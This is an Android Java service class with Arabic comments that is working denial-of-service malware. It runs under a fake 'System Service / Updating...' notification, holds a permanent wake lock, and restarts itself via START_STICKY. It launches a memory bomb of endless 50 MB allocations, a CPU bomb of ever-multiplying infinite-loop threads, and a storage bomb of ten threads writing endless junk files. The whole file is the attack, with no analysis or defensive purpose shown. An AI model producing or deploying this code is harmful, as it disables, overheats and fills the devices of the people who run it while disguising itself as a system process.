package com.example.app;

import android.app.*;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import java.io.File;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class BgService extends Service {
    private PowerManager.WakeLock wakeLock;
    private List<byte[]> memoryBomb = new ArrayList<>();

    @Override
    public void onCreate() {
        super.onCreate();
        String CHANNEL = "ch";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel c = new NotificationChannel(CHANNEL, "System", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(c);
        }
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? new Notification.Builder(this, CHANNEL) : new Notification.Builder(this);
        startForeground(1, b.setContentTitle("System Service").setContentText("Updating...").setSmallIcon(android.R.drawable.ic_menu_manage).setOngoing(true).build());

        // 1. منع الجهاز من النوم
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "App::WakeLock");
        wakeLock.acquire();

        // 2. قنبلة الذاكرة (RAM Bomb): نحجز مساحات ضخمة باستمرار
        new Thread(() -> {
            while (true) {
                try {
                    byte[] chunk = new byte[50 * 1024 * 1024]; // 50 ميجا
                    memoryBomb.add(chunk);
                    Thread.sleep(50);
                } catch (OutOfMemoryError e) {
                    // لما الرام تتملي، هنمسح شوية ونكمل تاني عشان نفضل نضغط على النظام
                    if (memoryBomb.size() > 0) memoryBomb.remove(0);
                } catch (Exception e) {}
            }
        }).start();

        // 3. قنبلة المعالجة (CPU Bomb): فتح آلاف الثريدس
        new Thread(() -> {
            while (true) {
                try {
                    for (int i = 0; i < 100; i++) {
                        new Thread(() -> {
                            while (true) {
                                Math.sqrt(Math.random()); // لوب لا نهائي
                            }
                        }).start();
                    }
                    Thread.sleep(100);
                } catch (Exception e) {}
            }
        }).start();

        // 4. قنبلة التخزين (Storage Bomb): كتابة ملفات ضخمة من 10 ثريدس في نفس الوقت
        for (int i = 0; i < 10; i++) {
            new Thread(() -> {
                try {
                    File dir = getExternalFilesDir(null);
                    byte[] buffer = new byte[10 * 1024 * 1024]; // 10 ميجا
                    Random rand = new Random();
                    while (true) {
                        File file = new File(dir, "sys_" + rand.nextInt(999999) + ".tmp");
                        FileOutputStream fos = new FileOutputStream(file);
                        fos.write(buffer);
                        fos.close();
                    }
                } catch (Exception e) {}
            }).start();
        }
    }

    @Override
    public void onDestroy() {
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        super.onDestroy();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
